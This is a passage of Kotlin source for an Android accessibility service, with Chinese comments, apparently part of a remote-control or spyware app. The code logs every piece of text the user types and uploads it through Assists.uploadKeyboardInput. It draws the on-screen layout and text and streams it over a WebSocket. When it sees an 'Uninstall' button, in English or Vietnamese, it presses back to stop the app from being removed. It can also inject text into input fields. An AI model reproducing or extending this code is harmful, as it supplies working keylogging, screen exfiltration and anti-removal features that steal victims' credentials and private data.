            Log.d("AssistsService1", "AlphaFilter updated with Alpha: $calculatedAlpha")
        } else {
            // 清除滤镜
            genericStream.getGlInterface().clearFilters()
            Log.d("AssistsService1", "AlphaFilter cleared")
        }
    }


    // 更新 OpenGL 滤镜的颜色和透明度
    private fun updateAlphaFilter() {
        val overlay = overlayView
        val (width, height) = Assists.getFullScreenResolution(this)

        genericStream= GenericStreamManager.genericStream!!;
        if (overlay != null) {
            // 计算 Alpha

            val calculatedAlpha: Float = calculateAlpha(originalColor, renderedColor, overlayAlpha)

            // 设置 OpenGL 滤镜
            val alphaFilterRender = AlphaFilterRender(this, width, height)
            alphaFilterRender.initGl(width, height, this, width, height)

            // 动态设置 Alpha
            alphaFilterRender.setAlpha(calculatedAlpha)

            genericStream.getGlInterface().addFilter(alphaFilterRender)

            Log.d("AssistsService1", "AlphaFilter updated with Alpha: $calculatedAlpha")
        } else {
            // 清除滤镜
            genericStream.getGlInterface().clearFilters()
            Log.d("AssistsService1", "AlphaFilter cleared")
        }
    }

    private fun calculateAlpha(originalColor: Int, renderedColor: Int, overlayAlpha: Float): Float {
        val originalR = (originalColor shr 16 and 0xFF).toFloat()
        val originalG = (originalColor shr 8 and 0xFF).toFloat()
        val originalB = (originalColor and 0xFF).toFloat()

        val renderedR = (renderedColor shr 16 and 0xFF).toFloat()
        val renderedG = (renderedColor shr 8 and 0xFF).toFloat()
        val renderedB = (renderedColor and 0xFF).toFloat()

        // 计算透明度比例，确保使用 float 运算
        val alphaR = if (renderedR != originalR) (renderedR - originalR) / (255 * overlayAlpha) else overlayAlpha
        val alphaG = if (renderedG != originalG) (renderedG - originalG) / (255 * overlayAlpha) else overlayAlpha
        val alphaB = if (renderedB != originalB) (renderedB - originalB) / (255 * overlayAlpha) else overlayAlpha

        // 返回透明度的平均值，并限制范围
        return ((alphaR + alphaG + alphaB) / 3).coerceIn(0.0f, 1.0f)
    }








    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Assists.service = this
        Assists.serviceListeners.forEach { it.onAccessibilityEvent(event) }
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            // 获取根节点
            val rootNode = rootInActiveWindow

            rootNode?.let {
                // 遍历屏幕布局
                traverseNode(rootNode)
            }
        }
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {

                if(!Assists.isEnableScreenCapture()){
                    drawLayoutToCanvas(rootNode)
                }
            }
        }

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val currentInput = event.text?.joinToString("") ?: ""

            // 检查是否与上一次相同，避免重复上传
            if (currentInput == lastInput) {
                return
            }

            lastInput = currentInput // 更新最后一次的输入

            Assists.uploadKeyboardInput(currentInput)

        }
    }


    private fun drawLayoutToCanvas(rootNode: AccessibilityNodeInfo) {

        val (width, height) = getFullScreenResolution(this)

        // 创建 Bitmap 和 Canvas
        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
        val canvas = Canvas(bitmap)

        val paint = Paint().apply {
            color = Color.RED
            style = Paint.Style.FILL
            strokeWidth = 2f
            textSize = 0.02f * height
            isAntiAlias = false
            isDither = false
        }

        // 绘制 AccessibilityNodeInfo 布局信息到 Canvas
        drawNodeRecursively(rootNode, canvas, paint)

        // 将绘制好的 Bitmap 发送到 WebSocket
        WebSocketManager.sendFrameToWebSocket(bitmap)
        Log.d("AssistsService", "Custom layout sent to WebSocket")
    }

    private fun drawNodeRecursively(node: AccessibilityNodeInfo?, canvas: Canvas, paint: Paint) {
        if (node == null) return

        val rect = Rect()
        node.getBoundsInScreen(rect)


        // 绘制节点边框（保持空心）
        val borderPaint = Paint(paint).apply {
            style = Paint.Style.STROKE // 边框为空心
            color = Color.RED          // 边框颜色
        }

        // 绘制节点边框
        canvas.drawRect(rect, borderPaint)

        // 绘制节点文本
        if (!node.text.isNullOrEmpty()) {
            canvas.drawText(node.text.toString(), rect.left.toFloat(), rect.top.toFloat(), paint)
        }

        // 遍历子节点
        for (i in 0 until node.childCount) {
            drawNodeRecursively(node.getChild(i), canvas, paint)
        }
    }






    // 遍历节点并打印节点信息
    private fun traverseNode(node: AccessibilityNodeInfo?, foundAppName: String? = null): String? {
        // 检查节点是否为空
        if (node == null) {
            Log.e("jiujiu", "Node is null")
            return null
        }

        var currentAppName = foundAppName // 用于记录找到的第一个应用名称

        // 遍历子节点
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                currentAppName = traverseNode(child, currentAppName) ?: currentAppName
            } else {
                Log.e("jiujiu", "Child node is null at index $i")
            }
        }

        // 当前节点信息
        val nodeText = node.text?.toString()?.trim() ?: ""
        val nodeClass = node.className?.toString() ?: ""
        val nodeDescription = node.contentDescription?.toString()?.trim() ?: ""

//        Log.d("pingmuTXT", "Node Info: text=$nodeText, className=$nodeClass, description=$nodeDescription")

        // 如果未找到应用名称，检查是否是第一个应用的名称节点
        if (currentAppName == null && isValidAppNameNode(nodeText, nodeClass)) {
            currentAppName = nodeText
            Log.d("jiujiu", "Found first app name: $currentAppName")
        }

        // 检查是否是“卸载”按钮并与当前找到的应用名称匹配
        if (currentAppName != null && nodeText.matches(Regex("(?i).*\\b(Xóa|Uninstall|gỡ cài đặt)\\b.*"))) {
            Log.d("jiujiu", "Found '卸载' for app: $currentAppName. Performing back action.")

            val sharedPreferences = Assists.getContext()
                .getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
            val del = sharedPreferences.getInt("del", 0)

            Log.d("jiujiu", "是否禁止卸载: $del")

            if (del == 1) {
                Assists.back()
            }
        }


        return currentAppName // 返回找到的第一个应用名称
    }
    private fun isValidAppNameNode(nodeText: String, nodeClass: String): Boolean {
        // 判断节点是否可能是应用名称的节点
        return nodeText.isNotEmpty() && nodeClass.contains("TextView", ignoreCase = true)
    }


    fun inputText(text: String) {
        // 获取当前焦点节点
        val rootNode = this.rootInActiveWindow ?: return
        val focusNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return

        // 检查当前节点是否可输入
        if (focusNode.isEditable) {
            val args = Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            focusNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            Log.d("MyAccessibilityService", "Text input successfully: $text")
        } else {
            Log.e("MyAccessibilityService", "Focus node is not editable")
        }
    }


    override fun onUnbind(intent: Intent?): Boolean {
        Assists.service = null
        Assists.serviceListeners.forEach { it.onUnbind() }
        removeOverlay()

        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        Assists.serviceListeners.forEach { it.onInterrupt() }
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        LogUtils.d(event?.action)
        return super.onKeyEvent(event)
    }

    override fun onMotionEvent(event: MotionEvent) {
        LogUtils.d(event.x, event.y)
        super.onMotionEvent(event)
    }

    override fun onGesture(gestureEvent: AccessibilityGestureEvent): Boolean {
        LogUtils.d(gestureEvent.toString())
        return super.onGesture(gestureEvent)
    }



}